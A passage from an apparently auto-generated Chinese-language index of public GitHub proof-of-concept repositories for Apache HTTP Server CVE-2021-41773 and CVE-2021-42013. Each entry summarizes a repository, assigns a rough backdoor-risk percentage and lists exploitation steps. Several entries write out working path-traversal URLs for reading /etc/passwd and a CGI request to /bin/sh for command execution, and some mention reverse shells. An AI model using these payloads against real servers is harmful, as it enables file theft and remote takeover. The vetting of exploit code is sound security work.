**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且开启了CGI支持，Alias配置不当，并且相关目录未进行权限限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773和CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50版本中存在的路径遍历漏洞。攻击者可以利用这些漏洞，通过构造包含特殊字符（如`.%2e`或`.%%32%65`）的URL，绕过服务器的路径检查，访问到Alias指令配置以外的文件。如果目标服务器同时开启了CGI支持，攻击者还可以执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2021-41773已经被证实存在，并且在野外被利用。提供的POC代码也通过Docker构建了易受攻击的环境，并提供了利用脚本，证明了该漏洞的可利用性。

**投毒风险：**

分析POC代码，该代码主要用于构建漏洞环境和执行漏洞利用。虽然代码本身看起来直接，但需要注意以下几点：

*   **Docker镜像来源：** POC需要构建Docker镜像。如果Docker镜像不是来自官方或可信来源，则可能包含恶意软件。
*   **执行任意命令：** RCE相关的POC会执行任意命令，如果攻击者修改了POC代码，可能会导致恶意代码执行。
*   **流量劫持风险：** POC通过curl发送特定请求来触发漏洞，如果网络环境被污染，可能导致流量劫持，使得攻击者可以篡改POC行为。
*   **文件篡改风险：** RCE相关的POC会写`/tmp/exploited`文件，如果服务器的`/tmp`目录权限设置不当，攻击者可以在其他用户不知情的情况下，篡改该文件，从而进一步扩大攻击。

综合以上考虑，认为此POC代码存在一定的投毒风险，但整体比例不高，约为10%。

**利用方式：**

1.  **环境搭建：** 使用Dockerfile构建包含漏洞的Apache HTTP Server环境（2.4.49或2.4.50版本）。
2.  **路径遍历：** 构造包含特殊字符的URL，例如：
    *   `/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd` (针对CVE-2021-41773)
    *   `/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd` (针对CVE-2021-42013)
3.  **文件读取：** 如果路径遍历成功，可以直接读取服务器上的敏感文件。
4.  **远程代码执行（RCE）：** 如果服务器开启了CGI支持，并且允许执行shell脚本，则可以通过路径遍历访问到shell脚本，并执行任意命令。例如，POC中使用了以下命令将字符串写入/tmp/exploited文件中：
    *   `echo “Successfully Exploited” > /tmp/exploited`
5.  **利用链：** 进一步的攻击可以包括反弹shell、权限提升、横向移动等。

**项目地址:** [OfriOuzan/CVE-2021-41773_CVE-2021-42013_Exploits](https://github.com/OfriOuzan/CVE-2021-41773_CVE-2021-42013_Exploits)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #14

**来源**: [CVE-2021-41773-Taldrid1_cve-2021-41773.md](../2021/CVE-2021-41773-Taldrid1_cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49版本，且存在Alias-like配置，目录未配置'require all denied'，开启CGI脚本支持（RCE利用场景）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符的 URL，访问服务器上受限目录之外的文件。

**有效性：**

提供的 Nmap NSE 脚本 `cve-2021-41773.nse` 似乎有效。它通过发送包含路径遍历字符（`/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`）的 HTTP GET 请求来检测漏洞。如果服务器返回状态码 200 并且响应体包含 `/etc/passwd` 文件的内容（`root:x:0:0:root`），则该脚本将报告目标为易受攻击。

搜索引擎结果也表明此漏洞已被积极利用，并且存在公开的 PoC 代码。

**投毒风险：**

在提供的 Nmap NSE 脚本中，没有明显的投毒代码。脚本的主要功能是发送 HTTP 请求并检查响应内容。该脚本允许用户指定扫描的子网范围和输出文件，但这些参数本身不会引入任何恶意行为。脚本通过判断/etc/passwd文件是否存在root账户判断是否漏洞存在，不会造成其他影响。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（例如，`/.%2e/.%2e/.%2e/`）的 URL，试图绕过服务器的路径规范化逻辑，访问受限目录之外的文件。
2.  **信息泄露：** 如果成功，攻击者可以读取服务器上的敏感文件，例如配置文件、源代码或用户数据。
3.  **远程代码执行（可选）：** 如果服务器启用了 CGI 脚本支持，攻击者可以通过路径遍历访问并执行任意 CGI 脚本，从而实现远程代码执行。这通常需要结合其他漏洞或配置错误。

**优先级排序理由：**

*   **搜索引擎结果：** 提供了关于漏洞是否被利用的背景信息，以及缓解措施的链接。 *   **漏洞利用代码：** 提供了直接验证漏洞的手段，使我们能够评估其有效性。 *   **漏洞库信息：** 提供了漏洞的官方描述，受影响的版本以及参考链接。

**项目地址:** [Taldrid1/cve-2021-41773](https://github.com/Taldrid1/cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #15

**来源**: [CVE-2021-41773-Vanshuk-Bhagat_Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013.md](../2021/CVE-2021-41773-Vanshuk-Bhagat_Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要Apache HTTP Server版本为2.4.49，且Alias-like指令配置不当或未启用"require all denied"保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中存在的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的URL，访问服务器上Alias-like指令配置以外的文件。如果这些文件没有被“require all denied”等默认安全配置保护，攻击者就可以成功读取它们。更进一步，如果CGI脚本在这些aliased路径上启用，攻击者甚至可以执行远程代码。

**有效性：**
漏洞库信息和搜索引擎结果都表明该漏洞是真实存在的，并且被广泛利用。提供的漏洞利用代码主要是一个README.md文件，描述了一个渗透测试项目，该项目评估了CVE-2021-41773和CVE-2021-42013漏洞。虽然这个README.md文件本身不是直接可用的exp代码，但是它暗示了利用该漏洞进行渗透测试是可行的。搜索引擎结果中也提到存在公开的PoC。

**投毒风险：**
README.md文件描述的是一个渗透测试过程的文档，其中包含使用Nmap、Gobuster等工具进行信息收集和漏洞评估，并没有发现直接的恶意代码。但是考虑到安全风险，该文档存在10%的投毒的可能性，因为不排除作者在文档中故意遗漏或隐藏了某些关键信息，从而误导使用者。例如,引导使用者下载特定版本的工具,该工具已经被植入后门等.

**利用方式：**
1.  **路径遍历：** 攻击者利用`..`等路径遍历字符，绕过服务器的目录限制，访问任意文件。
2.  **文件读取：**  如果目标文件未被`require all denied`等配置保护，攻击者可以读取文件内容，获取敏感信息，如配置文件、源代码等。
3.  **远程代码执行：**  如果服务器启用了CGI，攻击者可以通过路径遍历访问到CGI脚本，并执行任意命令。

利用方式通常涉及构造包含路径遍历字符的URL，例如：
`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
或
`..%2f..%2f..%2fetc/passwd`

攻击者需要根据服务器的具体配置和文件系统结构，调整路径遍历的深度和目标文件名，以成功利用该漏洞。

**项目地址:** [Vanshuk-Bhagat/Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013](https://github.com/Vanshuk-Bhagat/Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #16

**来源**: [CVE-2021-41773-ZephrFish_CVE-2021-41773-PoC.md](../2021/CVE-2021-41773-ZephrFish_CVE-2021-41773-PoC.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历（Path Traversal）/远程代码执行（RCE）

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且开启了`cgi-bin`或`icons`目录，以及未对Alias指令配置的目录进行“require all denied”限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中，是一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的 URL（包含编码后的路径遍历字符，如`.%2e`），访问服务器上受限目录之外的文件。如果服务器配置允许执行 CGI 脚本，则可能进一步导致远程代码执行。

**有效性：**
提供的`full.py`和`poc.py` PoC 代码尝试利用此漏洞。`full.py`脚本会读取目标列表（hosts.txt），然后针对每个目标，尝试通过 HTTP 和 HTTPS 协议，发送包含路径遍历的请求，访问`/etc/passwd`文件。如果响应中包含`root:*`字符串，则认为目标存在漏洞。

**投毒风险：**
查看提供的文件，`CODEOWNERS`和`README.md`没有发现恶意代码。 `poc.py`本身存在问题, 代码不完整，缺少发起请求的代码,有潜在风险,存在代码缺失,导致投毒或者payload失效，增加攻击者攻击复杂度。 `full.py` 脚本比较完整，但是代码质量不高，存在异常捕获 `except: pass`，可能隐藏一些错误信息。综合判断，该仓库存在一定概率的投毒风险，大约为10%。 主要体现在poc.py的请求代码缺失上，可能导致payload失效。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含`.%2e`等路径遍历字符的 URL，绕过服务器对 URL 的规范化处理。
2.  **文件读取：** 成功遍历路径后，攻击者可以读取服务器上的任意文件，例如`/etc/passwd`、web 应用的配置文件等。
3.  **远程代码执行（RCE）：** 如果服务器配置允许 CGI 脚本的执行，攻击者可以上传恶意脚本，并通过路径遍历漏洞访问该脚本，从而在服务器上执行任意代码。为了实现RCE，需要满足以下条件：开启了CGI支持，并且能够通过遍历访问到CGI脚本目录，同时该目录没有被 “require all denied” 保护。

**缓解措施：**
*   升级到 Apache HTTP Server 2.4.50 或更高版本。
*   配置 `Alias` 指令时，确保使用 `Require all denied` 限制对目录的访问。
*   禁用不必要的 CGI 脚本执行。

**项目地址:** [ZephrFish/CVE-2021-41773-PoC](https://github.com/ZephrFish/CVE-2021-41773-PoC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #17

**来源**: [CVE-2021-41773-Zyx2440_Apache-HTTP-Server-2.4.50-RCE.md](../2021/CVE-2021-41773-Zyx2440_Apache-HTTP-Server-2.4.50-RCE.md)

## CVE-2021-41773/CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，存在Alias-like指令配置，且相关目录没有“require all denied”保护。CGI脚本需要启用以进行RCE。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞源于Apache HTTP Server 2.4.49/2.4.50中路径规范化处理的缺陷。攻击者可以利用路径遍历漏洞读取服务器上的任意文件。如果服务器同时启用了CGI脚本，则可能导致远程代码执行。

**有效性分析：**

根据漏洞信息和搜索结果，该漏洞在野外被积极利用，具有较高的有效性。POC代码针对Apache 2.4.50版本，尝试利用路径遍历漏洞，首先检测CGI是否禁用，如果禁用则尝试读取/etc/passwd，如果CGI开启，则尝试执行反向shell。根据代码逻辑，该POC有一定的有效性，能检测和利用漏洞。

**投毒风险分析：**

代码中存在轻微的投毒风险。作者可能在LICENSE文件中隐藏了恶意代码，虽然该可能性较低，但是需要考虑到,或者在代码中存在一些对普通用户不友好的代码。 代码整体较为直接，没有明显的恶意行为，但仍需谨慎评估。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（如`.%%32%65`）的URL，绕过路径规范化检查，从而访问Alias-like指令配置以外的文件。例如，`/.%%32%65/.%%32%65/.%%32%65/etc/passwd`可以尝试读取`/etc/passwd`文件。
2.  **远程代码执行（RCE）：** 如果目标服务器启用了CGI，攻击者可以通过POST请求发送恶意代码，该代码将在服务器上执行。POC代码尝试注入一个反向shell，连接到攻击者指定的IP地址和端口。利用前提是服务器允许执行CGI脚本，并且没有对CGI脚本的执行进行严格的限制。

**项目地址:** [Zyx2440/Apache-HTTP-Server-2.4.50-RCE](https://github.com/Zyx2440/Apache-HTTP-Server-2.4.50-RCE)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #18

**来源**: [CVE-2021-41773-adrianmafandy_CVE-2021-41773.md](../2021/CVE-2021-41773-adrianmafandy_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server 2.4.49 Path Traversal & RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并启用了 CGI 脚本支持，并且Alias配置的目录没有 require all denied 限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。攻击者可以利用路径遍历绕过 Alias 指令的限制，访问服务器上的任意文件。如果目标服务器启用了 CGI 脚本，并且被访问的目录中存在可执行的 CGI 脚本，攻击者就可以通过构造恶意的 URL 来执行任意代码。

**有效性：**
提供的 POC 代码旨在利用此漏洞。`exploit.py` 脚本首先尝试通过发送包含路径遍历序列的 HTTP 请求来验证目标是否易受攻击，例如 `/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`。如果从 `/etc/passwd` 文件中检测到 "root:" 和 "bin/" 字符串，则认为目标易受攻击。然后，该脚本尝试利用漏洞通过反向 shell 在目标上执行任意代码。

**利用方式：**
1.  使用路径遍历序列（例如，`.%2e` 或 URL 编码的 `.%2532%2565`）来绕过目录限制。
2.  尝试读取敏感文件，如 `/etc/passwd`，以验证漏洞的存在。
3.  如果服务器配置允许，则利用 CGI 脚本执行任意命令。这通常涉及构造包含命令的 URL，并将该 URL 发送到易受攻击的服务器。
4. 设置监听器，等待反向shell连接。

**投毒风险：**
虽然主要代码看起来直接实现了漏洞利用，但仍然存在一定的投毒风险。可能性大约为 10%。

*   依赖关系：`exploit.py` 脚本依赖于 `requests` 库。虽然 `requests` 是一个流行的 Python 库，但存在供应链攻击的风险。恶意攻击者可能会尝试污染 `requests` 库或类似的依赖项，从而在不知不觉中将恶意代码引入到 `exploit.py` 中。
*   CGI配置的判断：如果目标服务器上未启用 CGI 或 CGI 配置不正确，该漏洞可能无法利用进行 RCE。POC代码中关于CGI的利用可能无法执行.
*   代码审查：在执行任何未经审核的代码（包括此 POC）之前，务必进行彻底的代码审查，以确保其不包含恶意功能。特别注意反向 shell 部分，确保它只执行预期命令。
*  作者动机: 无法完全信任代码作者的真实目的。尽管代码可能有效利用漏洞，但作者可能有意或无意地包含后门或恶意代码。
* 编码问题：URL 编码和解码可能存在问题，导致意外行为。

**项目地址:** [adrianmafandy/CVE-2021-41773](https://github.com/adrianmafandy/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #19

**来源**: [CVE-2021-41773-aqiao-jashell_CVE-2021-41773.md](../2021/CVE-2021-41773-aqiao-jashell_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，并且配置允许CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的 URL，读取服务器上受限目录之外的文件。如果服务器上启用了 CGI 脚本执行，则攻击者可以进一步利用此漏洞执行任意代码。

**有效性:**
根据漏洞库信息，搜索引擎结果，以及漏洞利用代码，提供的POC代码是有效的。漏洞库信息和搜索结果都表明此漏洞已被公开利用。

**投毒风险:**
提供的Go语言漏洞利用代码，主要功能是利用路径遍历漏洞读取`/etc/passwd`文件或执行命令。虽然代码本身实现了漏洞验证和利用功能，但仍然存在一定的投毒风险。

1.  **依赖风险:** Go程序需要编译，编译过程中可能引入恶意依赖。但是本项目代码量较小，依赖风险较低。
2.  **后门代码:** 检查代码后，发现其中并没有明显的恶意代码或后门。然而，攻击者可以修改代码以包含恶意功能，例如上传受害服务器的信息或执行其他恶意操作。
3.  **供应链风险:** 代码托管在第三方平台（GitHub），存在被篡改的风险。如果从不可信的来源下载代码，可能会下载到被修改过的恶意版本。

综合考虑，该仓库存在10%的投毒风险，主要来自潜在的依赖污染和代码篡改。

**利用方式:**
该漏洞的利用方式主要分以下几步：

1.  **路径遍历:** 攻击者构造包含`/.%2e`的恶意URL，尝试绕过Apache的路径规范化检查，从而访问服务器上任意文件。
2.  **信息泄露:** 如果路径遍历成功，攻击者可以读取敏感文件，例如`/etc/passwd`，获取系统用户信息。
3.  **远程代码执行:** 如果服务器启用了CGI脚本，攻击者可以通过POST请求将恶意命令传递给`sh`执行，从而实现远程代码执行。 例如，可以发送包含 `echo; <command>` 的POST请求到 `/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh`。

**项目地址:** [aqiao-jashell/CVE-2021-41773](https://github.com/aqiao-jashell/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #20

**来源**: [CVE-2021-41773-ashique-thaha_CVE-2021-41773-POC.md](../2021/CVE-2021-41773-ashique-thaha_CVE-2021-41773-POC.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历（Path Traversal）/远程代码执行（RCE）

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并可能需要启用`mod_cgi`模块且存在`Require all granted`配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。该漏洞源于 `ap_normalize_path` 函数在路径规范化处理上的缺陷，允许攻击者通过构造包含 URL 编码字符（如 `.%2e`）的恶意 URL，绕过路径遍历保护机制，访问服务器文件系统上受限目录之外的文件。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者利用 `.%2e` 绕过路径规范化，构造恶意 URL 以访问任意文件。例如，`http://target/cgi-bin/.%2e/.%2e/.%2e/etc/passwd` 可以用来尝试读取 `/etc/passwd` 文件。

2.  **远程代码执行（RCE）：** 如果服务器启用了 `mod_cgi` 模块，攻击者可以通过上传恶意 CGI 脚本并利用路径遍历漏洞执行该脚本，从而实现远程代码执行。这通常需要结合服务器配置中 `cgi-bin` 目录的 `Require all granted` 指令。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，POC 代码的存在进一步验证了其有效性。提供的 README.md 文件详细解释了漏洞原理和利用方法，并提供了搭建漏洞环境的步骤。

**投毒风险：**

虽然提供的 README.md 文件主要包含漏洞说明和环境搭建指导，但是依然存在一定的投毒风险。主要考虑到，如果攻击者修改了环境搭建脚本，例如在安装过程中植入后门，则可能导致受害者搭建一个包含恶意代码的 Apache 服务器。所以需要人工审核确认脚本的安全性，这里认为存在10%的投毒风险。

**总结：**

该漏洞的利用依赖于特定的 Apache 版本和服务器配置。成功利用该漏洞可能导致严重的后果，包括敏感信息泄露和远程代码执行。用户应尽快升级 Apache HTTP Server 版本以修复此漏洞。

**项目地址:** [ashique-thaha/CVE-2021-41773-POC](https://github.com/ashique-thaha/CVE-2021-41773-POC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #21

**来源**: [CVE-2021-41773-belajarqywok_CVE-2021-41773-MSF.md](../2021/CVE-2021-41773-belajarqywok_CVE-2021-41773-MSF.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的Apache HTTP Server 2.4.49版本，并且Alias-like 指令配置不当，未对外部文件进行访问限制，同时开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 漏洞是 Apache HTTP Server 2.4.49 版本中存在的一个路径遍历漏洞。攻击者可以通过构造包含特殊字符（如`.%%32%65`）的URL，绕过服务器的路径规范化检查，从而访问到Alias-like指令配置目录以外的文件。如果目标服务器未对这些目录的文件进行访问限制（`require all denied`），攻击者就能读取敏感信息。更进一步，如果服务器允许在这些路径下执行CGI脚本，攻击者就可以实现远程代码执行。

**有效性分析：**

漏洞库信息和搜索结果均表明该漏洞已在野外被利用，PoC代码的存在也证实了其可利用性。

**利用方式分析：**

根据漏洞描述和提供的PoC代码，可以总结出以下利用方式：

1.  **路径遍历攻击：** 攻击者构造包含特殊编码的路径，例如：`/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd`尝试读取`/etc/passwd`等敏感文件。
2.  **文件读取：**  如果服务器没有对目标文件进行访问限制，攻击者可以直接读取到文件内容。
3.  **远程代码执行（RCE）：** 如果目标路径允许执行CGI脚本，攻击者可以上传恶意脚本，然后通过路径遍历漏洞执行该脚本，从而实现远程代码执行。

**投毒风险分析：**

提供的PoC代码主要包含以下文件：

*   `1.rb`：一个 Metasploit 模块，尝试通过 GET 请求访问特定 URI（`http://192.168.137.1/cgi-bin/.%%32%65/htdocs/hacklab/websekolah/upload/test.txt`）。该模块的主要目的是读取文件，没有明显的恶意行为。
*   `2.rb`：另一个 Metasploit 模块，尝试通过 GET 请求获取 PDF 文件内容 (tugas.pdf)。该模块的主要目的是读取文件，没有明显的恶意行为。
*   `Makefile`：包含 Maven 命令，用于编译和执行 Java 代码。该命令执行 `com.shell.ReverseShell` 类，并传递一些参数，包括文件名、IP 地址、路径等。**`com.shell.ReverseShell` 存在潜在的投毒风险，因为它可能包含反向 shell 或其他恶意功能。**
*   `apache_rce.rb`：Metasploit 模块，未完全贴出，但是根据文件名推测是进行远程代码执行的模块，存在一定风险。

综合来看，`Makefile` 中调用的 Java 类 `com.shell.ReverseShell` 是最可疑的部分。如果该类包含恶意代码，例如反向 shell，那么执行此 Makefile 就可能导致受害者系统被控制。其他rb文件目前主要进行get请求，风险较低。

**风险评估：**

虽然大部分代码看起来是用于漏洞利用，但是 `Makefile` 中调用的`com.shell.ReverseShell` 存在潜在风险，如果里面包含恶意代码，比如反向 shell，则有被投毒的可能。因此，存在一定的投毒风险，比例估计为10%。

**项目地址:** [belajarqywok/CVE-2021-41773-MSF](https://github.com/belajarqywok/CVE-2021-41773-MSF)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #22

**来源**: [CVE-2021-41773-blackn0te_Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution.md](../2021/CVE-2021-41773-blackn0te_Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution.md)

## CVE-2021-41773/CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且存在可执行的CGI脚本目录

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 和 CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中的路径遍历漏洞。攻击者可以利用这些漏洞，通过构造特殊的URL来访问服务器上的任意文件，如果服务器启用了CGI脚本执行，则可能导致远程代码执行。

**有效性：**
提供的PoC代码（`exploit.py`）是有效的。它包含利用路径遍历读取任意文件和利用CGI执行远程代码的payload。脚本首先检查目标服务器是否易受攻击（通过检查`Server`头），然后根据用户选择的选项执行相应的攻击。

**投毒风险：**
分析提供的PoC代码，没有发现明显的投毒代码。代码结构清晰，功能明确，主要是构造恶意请求来利用漏洞。脚本中的操作都是为了验证和利用漏洞，没有发现任何隐藏的恶意行为。
投毒风险评估：0%

**利用方式：**
1.  **路径遍历：** 攻击者通过在URL中使用经过特殊编码的路径（例如，`.%2e/%2e%2e`）来绕过服务器的路径检查，从而访问受限目录之外的文件。PoC代码中提供了两个路径遍历Payload `payload1`和`payload2`，利用 `GET` 请求读取文件内容。
2.  **远程代码执行：** 如果服务器配置允许执行CGI脚本，攻击者可以通过路径遍历访问到`bin/sh`，然后通过POST请求将命令作为数据传递给`bin/sh`执行。PoC代码中构造了包含命令的POST请求，利用`req.Session()`和`req.Request()`发送请求并接收响应，实现交互式shell。

**总结：**
该漏洞的利用需要目标服务器存在漏洞版本（2.4.49或2.4.50），并且在路径遍历访问到文件之后，如果服务器配置允许，可以进一步利用CGI执行进行远程代码执行。提供的PoC代码可以成功验证并利用该漏洞，未发现投毒风险。

**项目地址:** [blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution](https://github.com/blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #23

**来源**: [CVE-2021-41773-blu3ming_PoC-CVE-2021-41773.md](../2021/CVE-2021-41773-blu3ming_PoC-CVE-2021-41773.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且受影响的Alias-like指令配置允许访问受限目录外的文件，同时CGI脚本未被禁用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径遍历漏洞。该漏洞源于Apache HTTP Server对路径规范化处理的缺陷。攻击者可以通过构造包含URL编码的路径遍历序列的恶意HTTP请求，绕过服务器的安全检查，读取服务器上任意文件，甚至可能执行任意代码。

**有效性分析：**

提供的PoC代码通过构造包含`/.%2e/%2e%2e/%2e%2e/%2e%2e/`的URL，利用Apache HTTP Server 2.4.49的路径遍历漏洞读取指定文件。PoC代码使用`urllib3`库发送HTTP请求，避免了`requests`库自动URL规范化导致的利用失败。
根据漏洞库信息、搜索引擎结果和PoC代码，可以判断该PoC代码有效。

**投毒风险分析：**

对提供的PoC代码进行分析，主要包括以下几个文件：

*   `README.md`: 描述了漏洞的详细信息、利用方法和示例。没有发现恶意代码。
*   `cve-2021-41773.py`: 漏洞利用脚本。该脚本的功能是发送包含恶意路径的HTTP请求，读取指定文件。没有发现明显的恶意代码，但存在潜在风险，即攻击者可能利用该脚本读取服务器上的敏感信息，并进行进一步的攻击。不过从代码本身来看，功能单一，不包含任何额外的后门或者恶意功能。
*   `requirements.txt`: 声明了所需的Python依赖库，包括`requests`和`urllib3`。这两个库都是常用的Python库，没有发现恶意库。

综合分析，该仓库中存在作者隐藏的投毒代码的可能性较低，但不能完全排除攻击者利用该脚本进行恶意活动的风险。

**利用方式：**

1.  **确定目标服务器：** 确定运行Apache HTTP Server 2.4.49的目标服务器。
2.  **检查配置：** 检查目标服务器的`Alias-like`指令配置，确认是否存在允许访问受限目录外的文件的配置。
3.  **构造恶意URL：** 构造包含URL编码的路径遍历序列的恶意URL，例如：`http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd`。
4.  **发送HTTP请求：** 使用PoC脚本或其他工具发送包含恶意URL的HTTP请求。
5.  **读取文件：** 如果漏洞利用成功，服务器将返回指定文件的内容。
6. **远程代码执行：** 如果CGI脚本被允许执行，攻击者可以上传一个恶意的CGI脚本并执行，从而实现远程代码执行。

**项目地址:** [blu3ming/PoC-CVE-2021-41773](https://github.com/blu3ming/PoC-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #24

**来源**: [CVE-2021-41773-charanvoonna_CVE-2021-41773.md](../2021/CVE-2021-41773-charanvoonna_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49版本，并且配置允许CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

